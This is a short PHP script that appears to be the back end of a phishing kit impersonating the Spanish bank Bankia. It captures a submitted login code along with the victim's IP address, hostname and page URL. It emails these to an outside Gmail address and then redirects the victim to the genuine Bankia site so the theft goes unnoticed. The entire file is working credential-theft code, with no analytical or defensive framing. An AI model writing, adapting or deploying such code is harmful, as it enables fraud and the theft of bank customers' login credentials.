<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "http://bankia.es/es/particulares";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Login ~~~~~~\n";
$message .= "code             : ".$_POST['codigo']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "~~~~~~~ ND7 ND7 ~~~~~~~\n";
$send = "resultas2040@gmail.com";
$subject = "bankia| $ip ";
$headers = "From:bankia <webmaster@localost>";
mail($send,$subject,$message,$headers);
 

header("Location: $back");

?>